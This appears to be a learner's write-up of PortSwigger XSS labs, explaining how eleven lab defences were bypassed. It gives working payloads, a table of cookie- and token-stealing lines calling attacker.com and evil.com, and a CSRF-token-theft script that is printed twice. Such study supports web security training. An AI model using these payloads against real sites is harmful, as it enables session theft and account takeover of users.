_______________
# XSS: Lab Index

- [Lab 01 — DOM XSS in jQuery anchor `href` attribute using `location.search`](https://www.google.com/search?q=%23dom-xss-in-jquery-anchor-href-attribute-using-locationsearch)
- [Lab 02 — DOM XSS in jQuery selector sink using a `hashchange` event](https://www.google.com/search?q=%23lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event)
- [Lab 03 — Reflected XSS into attribute with angle brackets HTML-encoded](https://www.google.com/search?q=%23lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded)
- [Lab 04 — Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://www.google.com/search?q=%23stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded)
- [Lab 05 — Reflected XSS into a JavaScript string with angle brackets HTML-encoded](https://www.google.com/search?q=%23reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
- [Lab 06 — DOM XSS in `document.write` sink using `location.search` inside a `select` element](https://www.google.com/search?q=%23lab-dom-xss-in-documentwrite-sink-using-locationsearch-inside-a-select-element)
- [Lab 07 — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://www.google.com/search?q=%23lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded)
- [Lab 08 — Reflected XSS with some SVG markup allowed](https://www.google.com/search?q=%23lab-reflected-xss-with-some-svg-markup-allowed)
- [Lab 09 — Reflected XSS protected by very strict CSP, with dangling markup attack](https://www.google.com/search?q=%23lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack)
- [Lab 10 — Reflected XSS protected by CSP, with CSP bypass](https://www.google.com/search?q=%23lab-reflected-xss-protected-by-csp-with-csp-bypass)
- [Lab 11 — Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://www.google.com/search?q=%23reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
- [PoC — Proof of Concept (PoC) & Impact Analysis](https://www.google.com/search?q=%23proof-of-concept-poc--impact-analysis)

___________________


# DOM XSS in jQuery anchor `href` attribute sink using `location.search`

- In this lab, the vulnerable point is the **`href`** attribute.  
    I checked the **submit feedback page** to see how the link was built.
    

<img width="826" height="696" alt="Captura de pantalla 2025-11-26 002805" src="https://github.com/user-attachments/assets/20e3e0df-a7e8-461d-b28b-705d455392ab" />

<img width="301" height="30" alt="Captura de pantalla 2025-11-26 002922" src="https://github.com/user-attachments/assets/1d5521ce-65e5-4d37-8298-b0558d188cb7" />

- Since the link redirects to `/`, I tested whether the protocol was validated by injecting:
    

`https://0a0500f604dae04681aa22040096009c.web-security-academy.net/feedback?returnPath=javascript:alert()`

- The payload executed, confirming that user input is inserted directly into the `href`.
    

## Analysis

This lab shows that **`href` is a dangerous sink** when the protocol is not validated.  
By allowing the `javascript:` scheme, a normal link becomes a **DOM XSS execution point**, running code under the site’s origin.

From a pentester’s view, the real issue is **missing protocol allowlisting**.

Simple keyword blocking is unreliable, so variants should always be tested:

- ```JaVaScRiPt:alert(1)```

- ```javascript:alert(1)```

- ```&#106;avascript:alert(1)```

## Real-world application

This pattern is common in parameters like `return`, `next`, or `redirect`.  
If vulnerable, it allows script execution, session theft, and full account compromise.

____________________________________________________________________

# Lab: DOM XSS in jQuery selector sink using a `hashchange` event

## Exercise explanation

While testing this lab, **I noticed** that the vulnerable code does not process the URL fragment on page load.  
Instead, it only reacts when the `hashchange` event is triggered.

```
$(window).on('hashchange', function(){     var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');     if (post) post.get(0).scrollIntoView(); });
```

The input from `location.hash` ends up inside a **jQuery selector**, which becomes the execution sink.
## Solution

<img width="1153" height="581" alt="Captura de pantalla 2026-01-16 213425" src="https://github.com/user-attachments/assets/1c0c97c9-b0c9-42e4-b616-704a6e476c61" />

```<iframe src="https://0af8007f0309c28b80ce6cfc000d0084.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```

I used an `<iframe>` to load the page first and **then force a hash change**, which triggers the event and executes the payload automatically, without user interaction.

## Real-world application

This lab helped me understand that **DOM XSS is often event-dependent**.  
In real applications, JavaScript frameworks rely heavily on events like `hashchange` or `popstate`, so a payload may fail simply because the right event was never triggered.

As a pentester, this taught me to look not only for where the input is reflected, but **what action actually activates the sink**, and whether that action can be forced programmatically

_________________

# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

- This lab highlights how **quote handling** is critical in XSS.  
    Since `< >` are HTML-encoded, classic payloads do not work. Instead, the attack relies on **JavaScript event handlers** like `onmouseover` and on understanding how data flows between the **server** and the **browser**.
    
- The first step is to understand the attribute structure returned by the server:

```<input type="text" placeholder="Search the blog..." name="search" value="example">```

- To exploit this, the goal is to **close the `value` attribute** and inject a new one.

**Payload:**

```" onmouseover="alert(1)```

- The server adds the final quote, resulting in a valid event handler:

```<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">```

- This lab reinforces that the **server encodes**, but the **browser decodes** automatically when rendering HTML.


**Simplified view:**

> The application encoded the input to display it safely, but decoding it again inside HTML attributes turned it back into executable code.

**Technical flow:**  
`User input` → `Server (HTML encoding)` → `Browser HTML parser (decoding)` → `Event attribute (execution)`

## Real-world application

The core issue is **trusting HTML encoding alone**.  
Even if the source code looks safe, the browser decodes entities and may transform user input into active attributes like `onmouseover`.

In real applications, this leads to reflected XSS that triggers on user interaction and can be used to steal sessions or execute arbitrary JavaScript.

____________

## Stored XSS into anchor `href` attribute with double quotes HTML-encoded

- In this lab, the attack is triggered when clicking on the **author name** of a stored comment.  
    While reviewing the HTML structure, I noticed that the username is rendered inside an **anchor (`<a>`) tag using the `href` attribute**.
    

<img width="688" height="210" alt="Captura de pantalla 2025-11-14 184509" src="https://github.com/user-attachments/assets/ba60abdd-1c1b-4127-a0c0-26600df550a6" />

- The problem is that **user-controlled input is stored and later injected directly into `href`**, without proper validation of the protocol.  
    This makes the link a persistent execution point for XSS once a victim clicks it.

- Because the payload is stored, **every user who interacts with that link triggers the malicious code**, not just the attacker.

### Real-world note

This pattern is common in **comment sections, user profiles, and author links**.  
If a stored value ends up inside an `href` without strict protocol validation (`http/https` only), it becomes a reliable vector for **stored DOM-based XSS**, affecting all future visitors.

____________________________

## Reflected XSS into a JavaScript string with angle brackets HTML-encoded

This lab has **three clear constraints** from the start:

- Angle brackets (`< >`) are HTML-encoded
- **Only JavaScript is usable** (no HTML injection)
- The input is reflected inside a **JavaScript string** (search parameter)
### Payload

```'-alert(1)-'```
#### What is actually happening

User input ends up inside a JavaScript string:

```searchTerms = 'hello'; document.write('<img src="/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '">');```

By injecting `'-alert(1)-'`:

- `'` closes the original string
- `alert(1)` is executed
- `-` works as a **syntactic bridge** so the expression stays valid
- The final `'` repairs the remaining code

The browser is not parsing HTML here — it is evaluating **JavaScript logic**, and the payload forms a valid expression.
### Core idea of the lab

When input is injected **inside a JavaScript string**, the goal is **not to escape HTML**, but to **break and repair JavaScript syntax**.

Operators like:

- - + , || &&

are used because they allow expressions to connect **without breaking execution**, not because they mean the same thing.
### Takeaway

- In JavaScript-string XSS, **syntax matters more than payload**
- JavaScript is strict: one syntax error breaks everything
- HTML is permissive: it tries to “fix” broken markup

That difference is critical in XSS.  
Sometimes you’re fighting a strict parser (JavaScript), and sometimes a very forgiving one (HTML). Knowing which one you’re dealing with changes the entire approach.

_________________________

## Lab: DOM XSS in `document.write` sink using `location.search` inside a `select` element

This lab presents a **stock checker** scenario where the attack vector is hidden in plain sight.  
Let’s look at the source code:

**JavaScript**

```
var stores = ["London","Paris","Milan"]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('<select name="storeId">'); if(store) {   document.write('<option selected>'+store+'</option>'); }
```

If we carefully compare the **source code** and the **front-end**, we notice a small but critical discrepancy.  
On the page, the application appears to handle the variable `productId`, but in the source code the script actually reads `storeId`.

<img width="285" height="43" alt="Captura de pantalla 2026-01-17 133718" src="https://github.com/user-attachments/assets/b8deba56-92af-418d-a559-23c82f11e25f" />

<img width="741" height="37" alt="Captura de pantalla 2026-01-17 133946" src="https://github.com/user-attachments/assets/b6fb83c3-44e9-4566-b851-f705a9a4210a" />

Once this mismatch is identified, it becomes clear that the attack vector must be focused on **`storeId`**.  
To do this, we manipulate the URL using the `&` (ampersand) character.

In URLs, `&` acts as a **parameter separator**. Since the URL already contains an initial parameter (`?productId=...`), we can use `&` to inject our malicious `storeId` parameter without breaking the original request. This allows the script to read our injected value and process it inside `document.write`.

That’s why we use the following payload:

<img width="1127" height="68" alt="Captura de pantalla 2026-01-17 133858" src="https://github.com/user-attachments/assets/6b907382-e330-418a-8340-1da5aab68673" />

With this payload, we close the existing `</select>` where `storeId` is injected and then append our exploit outside of it.

## Real-world application

In real-world scenarios, this lab is important because it shows how browsers **automatically “fix” broken HTML**, and in doing so, can turn seemingly harmless data into executable code — even inside elements that look safe, such as `<option>`.

Understanding this behavior helps a pentester identify **non-obvious XSS vulnerabilities**, especially in applications that rely on unsafe JavaScript functions like `document.write()`, insert URL parameters without sanitization, or assume that certain HTML elements inherently block injection. By knowing how the HTML parser auto-closes tags and how injected markup can escape its container, you can find XSS issues that automated tools often miss, reproduce subtle bugs, assess real risk accurately, and clearly explain to developers why relying on HTML structure alone is not sufficient.

_______________________________


## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab presents a very **realistic scenario** where **frameworks** are used — in this case **AngularJS**, which takes over the role of the **HTML DOM**, pushing it into the background and reducing it to a simple **information carrier**.

    This leads us to an important conclusion: a classic **XSS attack targeting raw HTML makes no sense here**. Instead, we must understand the internal structure of **Angular** and how the **Scope** works in order to exploit it.

In these situations, the **HTML DOM** delivers user input as **“dead data”** to Angular. That data only “comes to life” when Angular detects an interpolation expression **`{{ }}`**, recognizes it as its own syntax, and then evaluates it inside the **Scope**, executing whatever expression is contained within the interpolation. Based on this behavior, we craft our payload.

In AngularJS, the attack does not aim to break HTML, but rather to **hijack the framework’s execution engine from the inside**. We use the expression `{{$on.constructor('alert(1)')()}}` as a Trojan horse: first, we gain access to the **Scope** (Angular’s private memory space) through an existing function such as `$on`; once inside, we access its **`.constructor`**, which acts as JavaScript’s **master factory**, capable of transforming strings into executable code. By instructing this factory to create an `alert` function and immediately invoking it with the final `()`, we force execution.

The key trick is that this payload travels as **dead text** from the browser’s perspective, but becomes a **legitimate executable instruction** once it passes through Angular’s compilation “toll gate,” bypassing any traditional HTML-based filtering.

```{{$on.constructor('alert(1)')()}}```

To identify this vulnerability without triggering alarms, the analysis focuses on the **Scope exposure surface**. First, we locate interpolation points `{{ }}` where user-controlled data is reflected. Then, using the browser console, we audit Angular’s memory “bubble” with:

```angular.element(document.body).scope()```

If this inspection reveals active functions such as `$on` or `$watch`, we verify whether their `.constructor` points to the global `Function` constructor. This linkage is the **“master key”**: if it exists and the input is not properly sanitized, the environment is vulnerable by design.

This is a form of **static auditing**, where the risk can be confirmed simply by observing how the framework exposes its internal mechanisms to the HTML — before even sending the first exploit payload.

## Real-world application

This lab is critical because it teaches us to **audit the logic of modern frameworks**, not just the HTML. In real-world environments, this knowledge allows us to:

- **Detect modern sinks:** Understand that `{{ }}` interpolations can be just as dangerous as `innerHTML` when improperly handled.
- **Sandbox escape:** Train ourselves to identify “master keys” inside browser memory (**Scope**) that allow code execution where traditional HTML-based attacks would fail.
- **Bypass WAFs:** Demonstrate how traditional firewalls can be evaded, since the payload appears to be harmless application data rather than a classic script injection.

> **Conclusion:** This lab prepares us to audit **Single Page Applications (SPAs)** effectively, uncovering design-level flaws that automated security tools often overlook.

______________________

## Proof of Concept (PoC) & Impact Analysis

| Goal | Example Code (Malicious) |
| :--- | :--- |
| **Steal cookies** | `fetch('https://attacker.com?c=' + document.cookie)` |
| **Steal token** | `fetch('https://attacker.com?t=' + localStorage.getItem('token'))` |
| **Redirect** | `location.href = 'https://phishing.com'` |
| **Inject remote JS** | `eval(atob('c2Ny...'))` or `<script src="https://evil.com/payload.js"></script>` |
| **Modify the DOM** | `document.body.innerHTML = '<h1>Hacked</h1>'` | 

_________________________

## Lab: Reflected XSS with some SVG markup allowed

This lab first forces us to understand **what SVG is and how it works**, but more importantly, how to _**read the signals**_ provided by a **WAF (Web Application Firewall)** through **HTTP status codes**. The key learning here is developing a **structured mental model** to handle multiple variables systematically, using time in our favor instead of guessing blindly. Let’s break it down step by step.
### **What is SVG?**

**SVG (Scalable Vector Graphics)** is an XML-based image format used to describe two-dimensional vector graphics. Unlike formats such as PNG or JPEG (which are pixel-based), SVG defines shapes, paths, colors, and text using XML tags. SVG files can contain **JavaScript** and **event handlers**, which makes them a potential XSS attack vector if not properly sanitized. A malicious SVG can execute JavaScript as soon as it is rendered by the browser.

- **Normal SVG**

```<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">   <!-- SVG content here --> </svg>```

- **`xmlns`**: Defines the XML namespace for SVG.  
    For **SVG**, this attribute is **mandatory** — it must never be removed. Without it, the SVG will not work under any circumstances, and its value is always the same.

- **Malicious SVG**

```<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">   <rect width="100" height="100" fill="blue" /> </svg>```

Another fundamental concept for us as pentesters is understanding the **two core components of SVG**.
## Event Handlers

**Event handlers** are attributes within SVG elements that execute JavaScript when a specific event occurs (such as `onload`, `onclick`, `onmouseover`, `onbegin`, etc.).

**Example of SVG event handlers:**

```<svg xmlns="http://www.w3.org/2000/svg">   <rect onclick="alert('XSS!')" width="100" height="100" fill="green" /> </svg>```

Here, clicking on the green rectangle triggers the JavaScript code.
### SVG Markup / Tags

- Tags provide the **execution surface**. Most attacks start with `<svg>`, which opens the root SVG element. When HTML encounters `<svg>`, it interprets it as a **two-dimensional vector graphic**, which in pentester terms becomes **our first Trojan horse**.


```Each element, attribute, and style in an SVG file is defined by markup following W3C specifications. Unlike raster image formats (PNG or JPG), SVG markup is human-readable and editable as text, allowing manipulation through developer tools, scripts, and CSS.```

- **Graphic elements**: `<circle>`, `<rect>`, `<path>`, etc.
- **Attributes**: `width`, `height`, `fill`, `stroke`, etc.
- **Styles**: Embedded or external CSS.
- **Scripting**: `<script>` tags and event handlers.
- A complete list of SVG tags can be found here if needed:  
    [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### SVG Events

An event is a **notification** sent by the browser to signal that “something happened.” Since HTML already has events, it’s important to clarify the difference.

SVG is an XML-based language embedded into HTML5. Because of this, they share a lot of DNA, but they have **different personalities**.

|**Event Type**|**Main Trigger**|**User Interaction Required?**|**Real Payload Example**|
|---|---|---|---|
|**HTML**|Physical action or error|**YES** (most of the time)|`<img src=x onerror=alert(1)>`|
|**SVG**|Browser timing / animation|**NO** (automatic)|`<svg><animate onbegin=alert(1)>`|

- It’s important to note that there are **universal events** shared between **HTML** and **SVG**.

With these concepts in place, we can understand the solution. The lab title says **“Some SVG markup allowed”**, which means the first step is identifying which **tags** are permitted by the **WAF**. This naturally leads us to analyze **HTTP status codes**.

### WAF Behavior and Status Codes

- First, we verify whether `< >` are blocked by the firewall.

<img width="562" height="34" alt="Captura de pantalla 2026-01-18 155744 1" src="https://github.com/user-attachments/assets/e2abaf78-ddcb-4e5c-8838-10799cebfd47" />

- Once confirmed, we test whether the `<svg` keyword is filtered. Since it works, we proceed to test individual **SVG markup tags**. For this, we use **Burp Suite Intruder**, loading the tag list from:

[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

<img width="1543" height="304" alt="Captura de pantalla 2026-01-18 170220" src="https://github.com/user-attachments/assets/69e44cd6-6413-4f9a-b56b-08391187e1a6" />

- After running the attack, we identify which payloads return **HTTP 200**. These are the tags **not filtered by the WAF**:

```animatetransform image svg title```

### Event Injection

With the allowed tags identified, we now test which **event** can be used with the following payload:

```
%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E
```

Breaking it down:

```
%3C svg %3E   %3C animatetransform %20 onbegin %3D alert(1) %3E
```

Decoded:

```
<svg> <animatetransform onbegin=alert(1)>
```

We URL-encode the payload as a defensive measure to ensure the data is transmitted safely and interpreted correctly by the server.

- **It works.**  
    We successfully bypass the firewall by understanding what it allows and what it blocks.
### Key Takeaways

- In SVG-based XSS attacks, **nesting** (tag inside another tag) is critical. To avoid **HTTP 400 errors**, it’s best to tightly couple tags (`<svg><animatetransform...`) and remove unnecessary spaces, or use **URL encoding** (`%20` or `+`) when spaces are required.

- Server-safe payload example (URL encoded):


```
search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E
```

- The core insight of this lab is understanding that **event handlers follow a hierarchy**: some are heavily monitored by WAFs, while others are rarely used and therefore poorly filtered.  
    The `onbegin` event is a perfect example — it is **SVG-specific**, rarely abused, and often overlooked by firewalls, which makes it highly effective.


___________________


### Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

In this lab, I learned how to **steal a session-related token** by understanding and working around the security filters enforced by a strict **Content Security Policy (CSP)**. This attack requires a solid understanding of **JavaScript**, **HTML**, and how **GET** and **POST** requests behave.

To start, I used the **Exploit Server** provided by PortSwigger to simulate a real attacker-controlled infrastructure.
### What is CSP?

**CSP (Content Security Policy)** is a security layer designed to detect and mitigate attacks such as XSS. It works as a **whitelist** of rules sent by the server via HTTP headers.

I like to think of it as a guard on a bridge with a list of who is allowed to pass:

- **`script-src 'self'`**: Only allows scripts hosted on the same origin. Any injected or external script is blocked.

In this scenario, I focused on **reflected inputs** that end up inside the HTML to observe how the CSP reacts to different payloads.
### Attack Vector Analysis

The application allows users to update their email address. After submitting the form, the email is reflected back in the page and, in the source code, a **CSRF token** appears inside the form. That token becomes the main target.

1. **Injection test:** A classic payload like  
    `test@test.com"><script>alert()</script>`  
    is blocked by the CSP. On top of that, the input enforces `type="email"` validation.

2. **Validation bypass:** To test special characters such as `< >`, I temporarily changed the input type from `email` to `text` using the browser’s DevTools (F12).

3. **The blind spot:** CSPs are usually very strict with JavaScript but tend to **ignore structural HTML tags**. This is where HTML5 becomes the attack surface.
### Technique: Dangling Markup

**Dangling Markup** is a data exfiltration technique used when JavaScript execution is blocked by CSP. Instead of executing code, we inject **open tags or form-related attributes** to capture whatever comes next in the HTML.

**Test payload (PoC):**  
```test@test.com"><button formaction="https://google.com">STEAL</button>```

If clicking the button redirects to Google, the issue is confirmed. I used **GET** here because it’s easier to observe in the URL and usually less restricted than complex POST requests.
### Final Exploit

The idea is to use `formaction` to hijack the form and `formmethod="get"` to force the CSRF token to be sent in the URL to the exploit server.

<body>
<script>
/**
 * STEP 1: Environment setup
 */
const academyFrontend = "https://your-lab-id.web-security-academy.net/";
const exploitServer = "https://your-exploit-server-id.exploit-server.net/exploit";

/**
 * STEP 2: Loot extraction
 * Capture the CSRF token from the URL parameters.
 */
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    /**
     * STEP 3: Attack execution (silent POST)
     * Use the stolen token to change the victim’s email.
     */
    const form = document.createElement('form');
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;

    const email = document.createElement('input');
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    const token = document.createElement('input');
    token.name = 'csrf';
    token.value = csrf;

    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    /**
     * STEP 0: The bait
     * Redirect the victim to the vulnerable page with the injected button.
     */
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```
<body>
<script>
/**
 * STEP 1: Environment setup
 */
const academyFrontend = "https://your-lab-id.web-security-academy.net/";
const exploitServer = "https://your-exploit-server-id.exploit-server.net/exploit";

/**
 * STEP 2: Loot extraction
 * Capture the CSRF token from the URL parameters.
 */
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    /**
     * STEP 3: Attack execution (silent POST)
     * Use the stolen token to change the victim’s email.
     */
    const form = document.createElement('form');
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;

    const email = document.createElement('input');
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    const token = document.createElement('input');
    token.name = 'csrf';
    token.value = csrf;

    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    /**
     * STEP 0: The bait
     * Redirect the victim to the vulnerable page with the injected button.
     */
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>


## Real-World Application

1. **CSP blind spots:** Blocking JavaScript alone is not enough. If structural HTML injection is possible, **Dangling Markup** can completely bypass a strict CSP.

2. **The “dragging effect”:** By injecting a button inside a `<form>`, the browser automatically collects **all surrounding inputs**, including hidden CSRF tokens. Any input with a `name` attribute is sent to the attacker-defined `formaction`.

3. **Logistics and cost:** Running attacker infrastructure is **expensive** and leaves legal traces. In real attacks, adversaries often **abuse third-party infrastructure** instead. The Exploit Server represents that external hideout used to collect data (via logs) and trigger the final attack phase remotely and anonymously.

_____________________________

# Lab: Reflected XSS protected by CSP, with CSP bypass

- This exercise requires a deep understanding of **CSP directives**, how they work, and more importantly, how they can be manipulated. We start by testing a very simple payload:
    

```<img src=' onerror=alert()>```

After sending this payload, we inspect the page behavior using the browser developer tools. Something very important and interesting appears in this lab: the **`?token=`** parameter.

<img width="898" height="343" alt="Captura de pantalla 2026-01-22 022811" src="https://github.com/user-attachments/assets/32fbf96e-4ddb-4137-8832-f361024d5ddd" />

We need to move to the **Network** tab in the Developer Tools to analyze this in detail.

- The importance of this lab relies heavily on this **`token`** parameter, and understanding why is key.

For the purpose of this exercise, the **token** variable acts as a mechanism to track who is violating the **CSP** security policies. It works together with **`report-uri`**, which sends security reports to the server whenever a policy violation occurs. However, this **token** can also be used (to our advantage as pentesters) as an **attack vector** to modify the CSP rules themselves. This happens because the token allows us to inject text directly into the **CSP header**. We exploit this by adding **`script-src-elem`** and **`unsafe-inline`**.

### `script-src-elem`

The **`script-src-elem`** directive in **Content-Security-Policy (CSP) Level 3** defines the **valid sources for JavaScript loaded via `<script>` elements**, including both inline `<script>` blocks and external script files.

### `unsafe-inline`

The **`unsafe-inline`** directive in a **Content Security Policy (CSP)** allows the execution of inline scripts or styles. However, when `unsafe-inline` is used inside the `script-src` directive, it effectively disables the most important protection provided by CSP.


_**If the value of a reflected CSP parameter is controlled by the user, we gain the ability to modify it at will.**_


- With these concepts understood, we craft our payload directly in the URL:

<img width="1186" height="36" alt="Captura de pantalla 2026-01-22 031312" src="https://github.com/user-attachments/assets/a7161585-775f-4e7e-b0de-d87b053f045f" />

- **Red section**: the _entry point_ — the `token` parameter, which allows us to inject content into the CSP.
- 
- **Green section**: the CSP modification. A semicolon (`;`) is used to add a new directive (and also acts as a separator from the token).  
    We use `script-src-elem` to take advantage of directive precedence. Since it is more specific than `script-src`, the browser prioritizes it, allowing us to override the `'self'` restriction with `unsafe-inline` only for script elements.

- **Blue section**: the source definition that complements the directive. We choose `unsafe-inline`, enabling inline JavaScript execution.

- **Yellow section**: the injected script used to execute `alert()`.

- The previous step-by-step process demonstrates how to **modify the CSP** to successfully inject malicious JavaScript.

<img width="803" height="216" alt="Captura de pantalla 2026-01-22 032330" src="https://github.com/user-attachments/assets/30d4a8e5-6806-4d04-aca2-3fb16d39d0c3" />

## Key Concepts

1. Reading the **HTML response alone is not enough**. There are deeper and more critical layers where security-relevant information exists. In this case, analyzing **Network headers** was essential to understanding how the **CSP** was being constructed.

2. A deep understanding of **CSP configuration** is crucial. This lab highlights how CSP can be manipulated when user-controlled reflected variables exist, as demonstrated with the **token** parameter.

## Real-World Impact

This vulnerability occurs when servers dynamically build security headers using URL parameters (such as tracking or reporting tokens). The issue arises when the server blindly trusts user input. If characters like semicolons (`;`) are not properly filtered, the user gains the ability to **rewrite the site’s security policy directly from the URL**.

In practice, this shows that even a strict CSP becomes ineffective if the server allows users to influence its configuration. This mistake is often seen in **error-reporting or analytics features**, where tokens are used to identify the source of an issue without considering that this data will be interpreted as a browser-enforced security rule.

The impact is severe: it allows attackers to disable browser defenses in a single request. By injecting a higher-precedence directive, attackers can execute malicious scripts to **steal sessions or sensitive data**, all because a seemingly harmless URL parameter was not properly sanitized.

________________________________________________________________

## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

- This lab presents a search page where **single quotes (`'`)**, **double quotes (`"`)**, and **angle brackets (`<>`)** are escaped. This forces a deeper understanding of **JavaScript special characters** and, more importantly, how data flows **from the server to the browser**.
    
- If I send basic XSS payloads like `<script>alert()</script>`, they appear escaped in the response. Even more advanced payloads like `'-alert(1)-'` fail. So I had to look for a different angle.
    
- I reviewed JavaScript special characters here:  
    [[[https://github.com/Aquiles369/lista-de-caracteres-especiales](https://github.com/Aquiles369/lista-de-caracteres-especiales)]]
    
    From that list, I noticed that the **backslash (`\`)** is interesting because it’s an escape character and often treated differently by filters.
    
- To solve this lab, I had to understand **how the server filters input**.
    
    When I send a single quote (`'`), the server automatically prepends a backslash (`\`) to it, producing `\'`. This is meant to prevent the quote from closing the JavaScript string and block XSS.
    
- Knowing this behavior, I can abuse it using JavaScript’s own parsing rules.
    
    If the browser receives `\\`, JavaScript interprets it as a **single literal backslash**. That means the server-added backslash gets “consumed”, leaving the quote **unescaped**, which closes the original string and allows code injection.
    
- Based on that, the working payload is:
    

```
\'; alert() //
```

### Flow

- **On the server side:**
    
    - It sees the backslash `\` and allows it.
    - It sees the single quote `'` and escapes it by adding a backslash.
    - **Server output:** `\\'`

- **In the browser (JavaScript parsing):**
    
    - JS reads left to right and finds `\\`.
    - **JS rule:** `\\` becomes a single `\`.
    - The server’s escape is effectively neutralized.

- **The release:**
    
    - The remaining `'` is now **alone**.
    - JavaScript interprets it as: **“close the string here”**.

- Once that happens, the injected JavaScript executes successfully.


<img width="803" height="216" alt="Captura de pantalla 2026-01-22 032330" src="https://github.com/user-attachments/assets/c8bebb36-60fd-41d2-9654-4bc057478ff9" />


## Real-world application

- This lab shows that servers often apply **language-level filters** before sending data to the browser. Once that “cleaned” data reaches the client, the **JavaScript engine** (V8, SpiderMonkey, etc.) interprets it using its own rules.

`The security bug exists because the developer assumes that adding a backslash is enough to neutralize a quote, without considering that in JavaScript, one backslash can cancel another.`

- **The server is a blind cop:**  
    A truly safe server should escape **both** characters. If I send `\'`, a correct implementation should return `\\\'`. Since it doesn’t, the door stays open.


### How the server filters

- This filtering is **not done in JavaScript**, but in the backend language:
    
    - **PHP:** `addslashes()`
    - **Python:** `.replace("'", "\\'")`

Understanding these backend transformations is key to exploiting reflected XSS in JavaScript string contexts.

__________________















    















